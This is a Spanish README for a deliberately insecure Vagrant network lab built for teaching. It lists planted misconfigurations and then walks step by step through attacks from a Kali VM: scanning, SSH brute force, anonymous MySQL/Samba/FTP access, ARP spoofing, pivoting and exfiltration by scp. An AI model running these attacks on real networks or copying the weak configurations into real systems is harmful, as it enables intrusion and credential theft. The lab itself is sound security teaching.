# Bloque 4 — Insecure Network Lab

---

Infraestructura de red intencionadamente insegura para demostrar ataques reales sobre configuraciones incorrectas comunes en entornos corporativos.  
Debe usarse exclusivamente en este entorno aislado.

---

# Índice

1. [Descripción](#descripción)
2. [Topología](#topología)
3. [Máquinas virtuales](#máquinas-virtuales)
4. [Malas prácticas documentadas](#malas-prácticas-documentadas)
5. [Requisitos](#requisitos)
6. [Despliegue](#despliegue)
7. [Escenarios de ataque](#escenarios-de-ataque)
8. [Advertencia legal](#advertencia-legal)

---

# Descripción

Este bloque simula una red corporativa con errores de configuración reales y frecuentes. El objetivo es poder reproducir y comprender los ataques descritos en el capítulo 7 de la memoria, observando en un entorno controlado las consecuencias de cada mala práctica.

El laboratorio se compone de cuatro máquinas virtuales orquestadas con Vagrant sobre VirtualBox.

Todas las redes son internas (`intnet`) y no tienen salida real a internet durante las prácticas.  
La interfaz NAT de Vagrant solo se usa durante el aprovisionamiento inicial.

## Redes definidas

| Red | Rango | Descripción |
|---|---|---|
| `net-externa` | `100.70.9.0/24` | Red del atacante |
| `net-dmz` | `192.168.57.0/24` | Zona desmilitarizada expuesta |
| `net-interna` | `192.168.58.0/24` | Red corporativa con datos sensibles |

---

# Topología

> Pendiente de hacer.

---

# Máquinas virtuales

| VM | Box | IP | Red | RAM | Rol |
|---|---|---|---|---|---|
| `external-kali` | `kalilinux/rolling` | `100.70.9.10` | `net-externa` | 1024 MB | Atacante externo |
| `firewall` | `ubuntu/jammy64` | `100.70.9.1` / `192.168.57.1` / `192.168.58.1` | Todas | 512 MB | Firewall vulnerable |
| `dmz-server` | `ubuntu/jammy64` | `192.168.57.10` | `net-dmz` | 512 MB | Apache + FTP + Telnet |
| `internal-server` | `ubuntu/jammy64` | `192.168.58.10` | `net-interna` | 2048 MB | MySQL + Samba + SSH |

---

# Malas prácticas documentadas

# Firewall (`firewall`)

- Política `FORWARD DROP` por defecto pero con reglas explícitas que permiten todo el tráfico entre cualquier segmento.
- `ip_forward` habilitado sin restricción de rutas.
- Sin inspección de estado ni filtrado por protocolo.
- Reglas que permiten tráfico:
  - externo → DMZ
  - externo → interno
  - DMZ → interno
  sin limitación de puertos.
- Sin logging de tráfico.
- `rp_filter` desactivado.
- `accept_source_route` y `accept_redirects` habilitados.
- Sin NAT.

---

# DMZ (`dmz-server`)

- Apache con:
  - `ServerTokens Full`
  - `ServerSignature On`
- Directory listing habilitado en `/var/www/html`.
- `phpinfo()` accesible públicamente en `/info.php`.
- Panel `/admin/` sin autenticación.
- Directorio `/backup/` con:
  - `credentials.txt`
  - `network.txt`
- Sitio de phishing en:
  - `http://192.168.57.10:8080`
- FTP anónimo habilitado (`vsftpd`) con permisos de escritura.
- Telnet activo en puerto `23`.
- Usuario:
  - `ftpoperator:ftpoperator`
- Sin firewall local (`ufw` desactivado).
- Rutas estáticas hacia `internal-server`.

---

# Servidor interno (`internal-server`)

- SSH con:
  - `PermitRootLogin yes`
  - `PasswordAuthentication yes`
  - Sin límite de intentos
- Credenciales root:
  - `root:root`
- Banner SSH expone versión del sistema.
- MySQL:
  - `root` sin contraseña
  - `bind-address 0.0.0.0`
- Base de datos `corporativedb` con:
  - credenciales en texto plano
  - inventario completo de red
- Samba:
  - recurso `confidential`
  - acceso invitado sin autenticación
- Archivo:
  - `/srv/samba/confidential/passwords.txt`
- Sin firewall local.
- Rutas estáticas hacia DMZ y red externa.

---

# Requisitos

| Requisito | Valor |
|---|---|
| VirtualBox | >= 7.0 |
| Vagrant | >= 2.4 |
| Espacio en disco | ~15 GB |
| RAM mínima | 3 GB |
| RAM recomendada | 8 GB |
| Internet | Solo durante el primer `vagrant up` |

---

# Despliegue

```bash
# Entrar al laboratorio
cd 4-insecure-network-lab/

# Levantar todas las VMs
vagrant up

# Levantar una VM concreta
vagrant up external-kali

# Acceso por SSH
vagrant ssh external-kali
vagrant ssh internal-server

# Estado de las VMs
vagrant status

# Detener laboratorio
vagrant halt

# Destruir laboratorio
vagrant destroy -f
```

## Tiempos estimados

| Acción | Tiempo |
|---|---|
| Primera ejecución | 10-20 min |
| Ejecuciones posteriores | 3-10 min |
| Reinicio de VMs | 5-10 min |

> Nota: las VMs usan `box_check_update = false`.

---

# Escenarios de ataque

Todos los ataques se ejecutan desde `external-kali`.

```bash
vagrant ssh external-kali
```

---

# 1. Reconocimiento de red

## Escaneo de servicios

```bash
# Escaneo rápido
nmap 192.168.57.10

# Escaneo completo
nmap -sV -sC -O -p- -T4 192.168.58.10

# Enumeración SMB
enum4linux 192.168.58.10
```

## Descubrimiento ARP desde la DMZ

```bash
# Acceso Telnet
telnet 192.168.57.10
# Usuario: ftpoperator
# Password: ftpoperator
```

Una vez dentro de `dmz-server`, se puede escanear la red interna utilizando
`nmap -sn` (ping sweep), ya que el firewall enruta el tráfico pero no filtra
ICMP:
```bash
nmap -sn 192.168.58.0/24
```

### Qué demuestra

- El firewall actúa como router sin filtrado real.
- El atacante obtiene:
  - versiones exactas
  - servicios
  - hosts internos
- Facilita explotación de CVEs conocidos.

---

# 2. Acceso a la DMZ

# 2.1 Exfiltración vía HTTP

```bash
# Credenciales expuestas
curl http://192.168.57.10/backup/credentials.txt

# Mapa de red
curl http://192.168.57.10/backup/network.txt

# phpinfo()
curl http://192.168.57.10/info.php

# Panel admin
curl http://192.168.57.10/admin/
```

### Qué demuestra

- Directory listing + `ServerTokens Full`
- Exposición de:
  - credenciales
  - estructura de red
  - configuración del sistema

---

# 2.2 FTP anónimo

```bash
ftp 192.168.57.10
# Usuario: anonymous
# Password: 

ftp> ls
ftp> cd public
ftp> get readme.txt
ftp> get config_backup.txt
ftp> exit
```

### Qué demuestra

`config_backup.txt` contiene:

- Credenciales MySQL
- IP del servidor interno

---

# 2.3 Telnet — credenciales en claro

```bash
telnet 192.168.57.10
# Login: ftpoperator
# Password: ftpoperator
```

### Qué demuestra

Las credenciales viajan sin cifrar y pueden capturarse fácilmente.

---

# 2.4 Sitio de phishing

```bash
# Acceso al phishing
curl http://192.168.57.10:8080

# Envío de credenciales
curl -X POST http://192.168.57.10:8080/capture.php -d "username=admin&password=Password123!";

# Recuperar credenciales
ssh ftpoperator@192.168.57.10
cat /var/log/phishing.log
```

### Qué demuestra

- Captura de credenciales internas.
- Falta de segmentación de red.

---

# 3. Acceso a la red interna

# 3.1 Fuerza bruta SSH

```bash
# Fuerza bruta
hydra -l root -p root ssh://192.168.58.10

# Acceso SSH
ssh root@192.168.58.10
```

### Qué demuestra

- Credenciales débiles
- SSH sin protección
- Firewall permisivo

---

# 3.2 MySQL sin contraseña

## Acceso directo

```bash
mysql -h 192.168.58.10 -u root --skip-ssl

mysql> USE corporativedb;
mysql> SELECT * FROM user_credentials;
mysql> SELECT * FROM network_inventory;
mysql> SELECT * FROM employees;
```

## Pivoting desde la DMZ

```bash
telnet 192.168.57.10

mysql -h 192.168.58.10 -u root

mysql> USE corporativedb;
mysql> SELECT * FROM user_credentials;
```

### Qué demuestra

- No existe segmentación real.
- Comprometer la DMZ implica acceso interno.

---

# 3.3 Samba anónimo

## Desde Kali

```bash
smbclient //192.168.58.10/confidential -N

smb: \> ls
smb: \> get passwords.txt
smb: \> exit

cat passwords.txt
```

## Desde la DMZ

```bash
smbclient //192.168.58.10/confidential -N

smb: \> get passwords.txt
smb: \> exit
```

### Qué demuestra

`passwords.txt` contiene:

- `admin/admin123`
- `root/root`
- `ftpoperator/ftpoperator`

---

# 4. ARP Spoofing y captura de tráfico

```bash
# Habilitar forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# ARP spoofing
sudo arpspoof -i eth1 -t 192.168.57.10 192.168.57.1 &
sudo arpspoof -i eth1 -t 192.168.57.1 192.168.57.10 &

# Captura Telnet
sudo tcpdump -i eth1 -A -s0 port 23
```

En otra terminal:

```bash
telnet 192.168.57.10
```

Detener ataque:

```bash
sudo killall arpspoof tcpdump
sudo sysctl -w net.ipv4.ip_forward=0
```

### Qué demuestra

- Telnet y FTP transmiten credenciales sin cifrar.
- No existe protección ARP (`ARP inspection`).

---

# 5. Pivoting DMZ → red interna

```bash
# Acceso DMZ
ssh ftpoperator@192.168.57.10

# Acceso MySQL interno
mysql -h 192.168.58.10 -u root

mysql> SELECT * FROM corporativedb.user_credentials;

# Samba
smbclient //192.168.58.10/confidential -N

# SSH interno
ssh root@192.168.58.10
```

### Qué demuestra

Comprometer la DMZ equivale a comprometer toda la red interna.

---

# 6. Exfiltración de datos

```bash
# Dump MySQL
mysqldump -u root corporativedb > /tmp/corporativedb.sql

# Comprimir Samba
tar -czf /tmp/confidential.tar.gz /srv/samba/confidential/

# Exfiltración
scp /tmp/corporativedb.sql \
  vagrant@192.168.57.10:/home/vagrant/lab/captures/

scp /tmp/confidential.tar.gz \
  vagrant@192.168.57.10:/home/vagrant/lab/captures/
```

### Qué demuestra

- Ausencia de monitorización
- Ausencia de segmentación
- Exfiltración sin detección

---

# Advertencia legal

⚠️ Este laboratorio contiene configuraciones deliberadamente inseguras.

## Restricciones

- Uso exclusivamente educativo.
- Ejecutar únicamente en entornos aislados.
- No conectar a redes corporativas reales.
- No desplegar en producción.

## Consideraciones

- Todas las credenciales y datos son ficticios.
- Las IPs no deben solaparse con redes reales.
- El laboratorio está diseñado para funcionar sin acceso a internet durante las prácticas.

---